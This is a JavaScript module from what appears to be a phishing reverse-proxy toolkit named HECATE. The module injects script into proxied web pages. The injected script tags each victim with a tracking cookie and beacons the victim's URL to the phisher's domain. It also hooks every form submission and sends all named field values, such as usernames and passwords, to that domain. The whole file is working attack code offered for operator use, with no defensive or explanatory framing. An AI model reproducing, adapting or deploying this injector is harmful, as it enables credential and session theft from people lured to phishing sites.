'use strict';

/**
 * HECATE Evil Proxy — JS Injector
 * Injects operator-controlled JavaScript into proxied HTML pages.
 *
 * Injection payload does two things:
 *   1. Beacon — pings the HECATE API with victim session ID + current URL
 *   2. Form hook — intercepts form submit events and captures input values
 *      before they're sent to origin (supplements POST body capture)
 *
 * The injected script is self-contained and references the HECATE API
 * via the operator's phishing domain (no external calls to HECATE infra).
 *
 * Injection point: just before </body> for minimal render impact.
 */

const HECATE_SID_COOKIE = '_hcte';
const HECATE_API_PATH   = '/__h/beacon';  // handled by proxy server before forwarding

/**
 * Build the injection payload for a given lure.
 * @param {string}  lureId
 * @param {string}  phishDomain
 * @param {boolean} injectFormHook   - capture form submissions
 * @returns {string} JavaScript payload (minified-ish)
 */
function buildPayload(lureId, phishDomain, injectFormHook = true) {
  return `
(function(){
  var L="${lureId}",H="${HECATE_API_PATH}",C="${HECATE_SID_COOKIE}";
  function sid(){
    var m=document.cookie.match(new RegExp('(?:^|;)\\s*'+C+'=([^;]*)'));
    if(m)return m[1];
    var n=Math.random().toString(36).slice(2)+Date.now().toString(36);
    document.cookie=C+'='+n+';path=/;SameSite=None;Secure';
    return n;
  }
  var s=sid();
  function beacon(d){
    var u='https://${phishDomain}'+H;
    var b=JSON.stringify(Object.assign({l:L,s:s,u:location.href},d||{}));
    if(navigator.sendBeacon){navigator.sendBeacon(u,b);return;}
    var x=new XMLHttpRequest();
    x.open('POST',u,true);
    x.setRequestHeader('Content-Type','application/json');
    x.send(b);
  }
  beacon({ev:'pageview'});
  ${injectFormHook ? buildFormHook() : ''}
})();
`.trim();
}

function buildFormHook() {
  return `
  document.addEventListener('submit',function(e){
    var f=e.target,d={};
    for(var i=0;i<f.elements.length;i++){
      var el=f.elements[i];
      if(el.name&&el.value)d[el.name]=el.value;
    }
    beacon({ev:'form',action:f.action,method:f.method,fields:d});
  },true);
`;
}

/**
 * Inject the payload into an HTML body.
 * Inserts just before </body>. Falls back to end of body if tag missing.
 * Returns the modified HTML.
 *
 * @param {string} html
 * @param {string} lureId
 * @param {string} phishDomain
 * @param {boolean} injectFormHook
 */
function inject(html, lureId, phishDomain, injectFormHook = true) {
  if (!html || !html.includes('<')) return html;

  const payload  = buildPayload(lureId, phishDomain, injectFormHook);
  const tag      = `<script data-hecate="1">${payload}</script>`;
  const closeBody = /(<\/body\s*>)/i;

  if (closeBody.test(html)) {
    return html.replace(closeBody, `${tag}\n$1`);
  }

  return html + '\n' + tag;
}

/**
 * Check if an HTML string already has the injection.
 */
function isInjected(html) {
  return html?.includes('data-hecate="1"') ?? false;
}

module.exports = { inject, buildPayload, isInjected, HECATE_SID_COOKIE, HECATE_API_PATH };
